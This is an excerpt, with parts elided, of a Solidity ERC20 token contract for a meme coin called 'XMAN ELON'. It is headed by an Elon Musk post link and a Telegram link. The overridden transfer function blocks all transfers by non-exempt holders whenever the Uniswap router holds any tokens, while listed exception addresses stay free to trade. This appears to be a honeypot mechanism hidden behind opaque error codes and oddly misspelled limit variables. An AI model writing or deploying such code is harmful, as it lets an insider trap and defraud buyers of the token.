...
https://x.com/elonmusk/status/1915572372842963181
https://t.me/XMAN_ELON_PORTAL
...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "1XMAN");
        require(recipient != address(0), "2XMAN");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "3XMAN");
    ...
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "4XMAN");
        require(spender != address(0), "5XMAN");
...
contract XMAN is ERC20 {
    ...
    constructor(address router) ERC20("XMAN ELON", "XMAN", TOTAL_SUSUPPLYS) {
    ...
    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0), "6XMAN");
        require(to != address(0), "7XMAN");
        _checkLimitation(from, to, amount);
        if (amount == 0) {
            return;
        }
        if (!isException[from] && !isException[to]) {
            require(balanceOf(address(uniswapV2Router)) == 0, "8XMAN");
        }
    ...
    function _checkLimitation(address from, address to, uint256 amount) internal {
        if (!hasLimit_) {
            if (!isException[from] && !isException[to]) {
                require(amount <= maxTxAmountbesomes, "9XMAN");
                ...
                require(balanceOf(to) + amount <= maxwalletssetsomes, "0XMAN");
            }
        }
    }
}